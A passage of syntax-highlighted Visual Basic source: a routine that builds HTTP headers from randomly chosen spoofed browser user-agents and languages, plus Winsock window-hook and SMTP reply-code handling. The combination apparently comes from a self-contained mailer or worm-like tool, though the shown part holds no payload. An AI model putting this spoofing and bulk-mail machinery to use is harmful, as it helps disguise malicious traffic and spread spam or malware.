</span><span class="sc7">Ar2</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Array</span><span class="sc6">(</span><span class="sc4">"es-mx"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"de"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"ca"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"pl"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"en"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"en-us"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"en-gb"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"fr"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"nl"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"ja"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"es-es"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"es"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"es-ar"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"es-co"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">GetHTTP</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GetHTTP</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"Accept-Language: "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Ar2</span><span class="sc6">(</span><span class="sc7">Int</span><span class="sc6">(</span><span class="sc7">Rnd</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">UBound</span><span class="sc6">(</span><span class="sc7">Ar2</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)))</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0">
</span><span class="sc7">Ar3</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Array</span><span class="sc6">(</span><span class="sc4">"gzip"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"gzip, deflate"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">GetHTTP</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GetHTTP</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"Accept-Encoding: "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Ar3</span><span class="sc6">(</span><span class="sc7">Int</span><span class="sc6">(</span><span class="sc7">Rnd</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">UBound</span><span class="sc6">(</span><span class="sc7">Ar3</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)))</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0">
</span><span class="sc7">Ar4</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Array</span><span class="sc6">(</span><span class="sc4">"Mozilla/4.0 ("</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">" Mozilla/4.4 ("</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Mozilla/5.0 ("</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Mozilla/4.8 ("</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Mozilla/2.0 ("</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Mozilla/3.0 ("</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Opera/6.05 ("</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Opera/6.03 ("</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Opera/7.20 ("</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">Ar5</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Array</span><span class="sc6">(</span><span class="sc4">"compatible; MSIE 6.0; "</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"compatible; MSIE 5.01; "</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"compatible; MSIE 5.0; "</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Windows; U; "</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"compatible; MSIE 5.21; "</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Macintosh; U; "</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"compatible; Konqueror/3; "</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Windows XP; "</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Windows 98; "</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Windows 2000; "</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Windows NT 5.0; "</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Windows NT 5.1; "</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Linux 2.4.18-4GB i686; "</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"compatible; MSIE 3.0; "</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"compatible; StarOffice/5.2; "</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">Ar6</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Array</span><span class="sc6">(</span><span class="sc4">"Windows 98)"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Windows XP)"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Windows 98; Win 9x 4.90)"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Windows NT 5.1)"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Windows NT 5.0)"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Windows 95)"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"WinNT4.0)"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Mac_PowerPC)"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"PPC)"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Linux)"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"U) [de]"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"U) [pl]"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"U) [es]"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"U) [en]"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"U) [fr]"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Windows 3.1)"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Win32)"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">GetHTTP</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GetHTTP</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"UserAgent: "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Ar4</span><span class="sc6">(</span><span class="sc7">Int</span><span class="sc6">(</span><span class="sc7">Rnd</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">UBound</span><span class="sc6">(</span><span class="sc7">Ar4</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)))</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Ar5</span><span class="sc6">(</span><span class="sc7">Int</span><span class="sc6">(</span><span class="sc7">Rnd</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">UBound</span><span class="sc6">(</span><span class="sc7">Ar5</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)))</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Ar6</span><span class="sc6">(</span><span class="sc7">Int</span><span class="sc6">(</span><span class="sc7">Rnd</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">UBound</span><span class="sc6">(</span><span class="sc7">Ar6</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)))</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0">
</span><span class="sc7">Ar7</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Array</span><span class="sc6">(</span><span class="sc7">URL</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">":80"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">URL</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">GetHTTP</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GetHTTP</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"Host: "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Ar7</span><span class="sc6">(</span><span class="sc7">Int</span><span class="sc6">(</span><span class="sc7">Rnd</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">UBound</span><span class="sc6">(</span><span class="sc7">Ar7</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)))</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">Hook</span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hWnd</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc1">'OK
</span><span class="sc0">    </span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">lpPrevWndProc</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">SetWindowLong</span><span class="sc6">(</span><span class="sc7">hWnd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">GWL_WNDPROC</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">AddressOf</span><span class="sc0"> </span><span class="sc7">WindowProc</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">UnHook</span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hWnd</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc1">'OK
</span><span class="sc0">    </span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">SetWindowLong</span><span class="sc6">(</span><span class="sc7">hWnd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">GWL_WNDPROC</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">lpPrevWndProc</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">WindowProc</span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hw</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">uMsg</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">wParam</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lParam</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc1">'OK
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">

</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">x</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">a</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">ReadBuffer</span><span class="sc6">(</span><span class="sc2">1000</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Byte</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">e_err</span><span class="sc0">
</span><span class="sc3">Select</span><span class="sc0"> </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc7">uMsg</span><span class="sc0">

 </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc2">1025</span><span class="sc0">
 </span><span class="sc7">e_err</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">WSAGetAsyncError</span><span class="sc6">(</span><span class="sc7">lParam</span><span class="sc6">)</span><span class="sc0">
 </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">e_err</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">do_cancel</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
               
   </span><span class="sc3">Select</span><span class="sc0"> </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc7">lParam</span><span class="sc0">
    </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc7">FD_READ</span><span class="sc0">
    </span><span class="sc7">x</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">recv</span><span class="sc6">(</span><span class="sc7">mysock</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">ReadBuffer</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">x</span><span class="sc0"> </span><span class="sc6">&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
    </span><span class="sc7">a</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">StrConv</span><span class="sc6">(</span><span class="sc7">ReadBuffer</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vbUnicode</span><span class="sc6">):</span><span class="sc0"> </span><span class="sc7">rtncode</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Val</span><span class="sc6">(</span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">a</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc6">))</span><span class="sc0">
     </span><span class="sc3">Select</span><span class="sc0"> </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc7">rtncode</span><span class="sc0">
     </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc2">550</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">551</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">552</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">553</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">554</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">451</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">452</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">500</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">do_cancel</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
     </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Select</span><span class="sc0">
    </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
            
 </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc7">FD_CONNECT</span><span class="sc0">
 </span><span class="sc7">mysock</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">wParam</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">Progress</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Progress</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

 </span><span class="sc3">Case</span><span class="sc0"> </span><span class="sc7">FD_CLOSE</span><span class="sc0">
 </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">closesocket</span><span class="sc6">(</span><span class="sc7">mysock</span><span class="sc6">)</span><span class="sc0">
 
 </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Select</span><span class="sc0">
 </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Select</span><span class="sc0">

    </span><span class="sc7">WindowProc</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">CallWindowProc</span><span class="sc6">(</span><span class="sc7">lpPrevWndProc</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">hw</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">uMsg</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">wParam</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">lParam</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">WSAGetAsyncError</span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lParam</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Integer</span><span class="sc0">
</span><span class="sc1">'OK
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">WSAGetAsyncError</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">lParam</span><span class="sc0"> </span><span class="sc3">And</span><span class="sc0"> </span><span class="sc2">&amp;HFFFF0000</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">\</span><span class="sc0"> </span><span class="sc2">&amp;H10000</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">bSmtpProgress</span><span class="sc6">(</span><span class="sc7">b</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Boolean</span><span class="sc0">
</span><span class="sc1">'OK
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">TimeOut</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Variant</span><span class="sc0">
</span><span class="sc7">TimeOut</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Timer</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">60</span><span class="sc0">
</span><span class="sc3">While</span><span class="sc0"> </span><span class="sc7">Progress</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc7">b</span><span class="sc0">
        </span><span class="sc7">DoEvents</span><span class="sc0">
        </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">do_cancel</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
        </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">closesocket</span><span class="sc6">(</span><span class="sc7">mysock</span><span class="sc6">):</span><span class="sc0"> </span><span class="sc7">mysock</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc7">bSmtpProgress</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
            </span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">
        </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
        
        </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Timer</span><span class="sc0"> </span><span class="sc6">&gt;</span><span class="sc0"> </span><span class="sc7">TimeOut</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
            </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">closesocket</span><span class="sc6">(</span><span class="sc7">mysock</span><span class="sc6">):</span><span class="sc0"> </span><span class="sc7">mysock</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc7">bSmtpProgress</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
            </span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">
        </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">Wend</span><span class="sc0">
</span><span class="sc7">bSmtpProgress</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">bSmtpProgress1</span><span class="sc6">(</span><span class="sc7">b</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Boolean</span><span class="sc0">
</span><span class="sc1">'OK
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">TimeOut</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Variant</span><span class="sc0">
</span><span class="sc7">TimeOut</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Timer</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">180</span><span class="sc0">
</span><span class="sc3">While</span><span class="sc0"> </span><span class="sc7">rtncode</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc7">b</span><span class="sc0">
        </span><span class="sc7">DoEvents</span><span class="sc0">
        </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">do_cancel</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
        </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">closesocket</span><span class="sc6">(</span><span class="sc7">mysock</span><span class="sc6">):</span><span class="sc0"> </span><span class="sc7">mysock</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc7">bSmtpProgress1</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
            </span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">
        </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
        
        </span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Timer</span><span class="sc0"> </span><span class="sc6">&gt;</span><span class="sc0"> </span><span class="sc7">TimeOut</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
            </span><span class="sc3">Call</span><span class="sc0"> </span><span class="sc7">closesocket</span><span class="sc6">(</span><span class="sc7">mysock</span><span class="sc6">):</span><span class="sc0"> </span><span class="sc7">mysock</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc7">bSmtpProgress1</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
            </span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">
        </span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">Wend</span><span class="sc0">
</span><span class="sc7">rtncode</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc7">bSmtpProgress1</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">
</span></div></body>
</html>
